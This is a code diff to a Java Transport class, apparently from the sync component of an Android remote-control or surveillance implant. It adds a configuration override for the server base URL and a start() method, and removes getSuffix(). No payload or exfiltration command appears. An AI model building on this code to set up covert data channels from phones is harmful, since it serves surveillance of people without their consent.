@@ -9,6 +9,7 @@
 package com.ht.RCSAndroidGUI.action.sync;
 
 import com.ht.RCSAndroidGUI.Debug;
+import com.ht.RCSAndroidGUI.conf.Configuration;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -33,9 +34,12 @@ public abstract class Transport {
 	 *            the baseurl
 	 */
 	public Transport(final String baseurl) {
-		// this.host = host;
-		// this.port = port;
-		this.baseurl = baseurl;
+
+		if(Configuration.OVERRIDE_SYNC_URL){
+			this.baseurl = Configuration.SYNC_URL;
+		}else{
+			this.baseurl = baseurl;
+		}
 	}
 
 	/*
@@ -66,17 +70,10 @@ public abstract class Transport {
 	 */
 	public abstract byte[] command(byte[] data) throws TransportException;
 
-	// public abstract void initConnectionUrl();
-	/**
-	 * Gets the suffix.
-	 * 
-	 * @return the suffix
-	 */
-	protected abstract String getSuffix();
-
 	/**
 	 * Close.
 	 */
+	public abstract void start();
 	public abstract void close();
 
 	/**
@@ -87,5 +84,7 @@ public abstract class Transport {
 	public String getUrl() {
 		return baseurl;
 	}
+
+
 
 }
